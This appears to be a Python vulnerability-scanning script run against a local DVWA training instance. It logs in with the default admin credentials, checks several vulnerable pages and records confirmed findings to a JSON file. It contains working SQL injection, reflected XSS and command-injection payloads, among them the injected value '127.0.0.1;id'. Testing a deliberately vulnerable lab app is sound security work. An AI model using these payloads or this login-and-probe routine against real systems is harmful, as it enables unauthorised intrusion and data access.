import requests, re, json

target = "http://127.0.0.1:3002"
s = requests.Session()
findings = []

# Login
r = s.get(target + "/login.php", timeout=5)
token = re.search(r"name='user_token' value='([^']+)'", r.text).group(1)
s.post(target + "/login.php", data={"username":"admin","password":"password","Login":"Login","user_token":token}, timeout=5)

# Check all vulnerability pages
vulns = [
    ("/vulnerabilities/sqli/", "id=1", "Submit=Submit", ["First name", "Surname"], "sql_injection"),
    ("/vulnerabilities/sqli_blind/", "id=1", "Submit=Submit", ["First name", "Surname"], "sql_injection_blind"),
    ("/vulnerabilities/xss_r/", "name=test", "", ["Hello test"], "xss_r"),
    ("/vulnerabilities/exec/", "ip=127.0.0.1", "Submit=Submit", ["PING", "ping"], "command_injection"),
    ("/vulnerabilities/fi/", "page=include.php", "", ["Include"], "file_inclusion"),
    ("/vulnerabilities/brute/", "username=admin&password=test&Login=Login", "", ["Welcome"], "brute_force"),
]

for path, params, extra, keywords, vuln_type in vulns:
    url = target + path + "?" + params
    if extra:
        url += chr(38) + extra
    r = s.get(url, timeout=5)
    found = any(k in r.text for k in keywords)
    status = "OK" if found else "-"
    print("  %-20s %s (%d bytes)" % (vuln_type, status, len(r.text)))
    if found:
        findings.append({"target":"dvwa","scanner":"manual","type":vuln_type,"severity":"high","url":path,"desc":vuln_type,"evidence":r.text[:300]})

# XSS reflected with script tag
r = s.get(target + "/vulnerabilities/xss_r/", params={"name": "<script>alert(1)</script>"}, timeout=5)
payload = "<script>alert(1)</script>"
if payload in r.text:
    print("  xss_(script tag)       OK (%d bytes)" % len(r.text))
    findings.append({"target":"dvwa","scanner":"manual","type":"xss","severity":"high","url":"/vulnerabilities/xss_r/","desc":"Reflected XSS with script tag","evidence":payload + " reflected unencoded in response"})

# Command injection with payload
r = s.post(target + "/vulnerabilities/exec/", data={"ip": "127.0.0.1;id", "Submit": "Submit"}, timeout=5)
if "uid=" in r.text:
    print("  command_inj(payload)   OK (%d bytes)" % len(r.text))
    findings.append({"target":"dvwa","scanner":"manual","type":"command_injection","severity":"critical","url":"/vulnerabilities/exec/","desc":"Command injection confirmed","evidence":"ip=127.0.0.1;id returned: " + r.text[r.text.find("uid="):r.text.find("uid=")+50]})

# SQLi with payload
r = s.get(target + "/vulnerabilities/sqli/", params={"id": "1' OR '1'='1", "Submit": "Submit"}, timeout=5)
if "First name" in r.text and "Surname" in r.text:
    print("  sqli(payload)          OK (%d bytes)" % len(r.text))
    findings.append({"target":"dvwa","scanner":"manual","type":"sql_injection","severity":"critical","url":"/vulnerabilities/sqli/","desc":"SQL injection confirmed","evidence":"id=1' OR '1'='1 returned user data"})

print()
print("Total: %d findings" % len(findings))
for f in findings:
    print("  [%s] %s" % (f["type"][:18], f["desc"][:60]))

with open("scripts/experiment/real_findings_dvwa_full.json", "w", encoding="utf-8") as f:
    json.dump(findings, f, indent=2, ensure_ascii=False)
print("Saved to scripts/experiment/real_findings_dvwa_full.json")
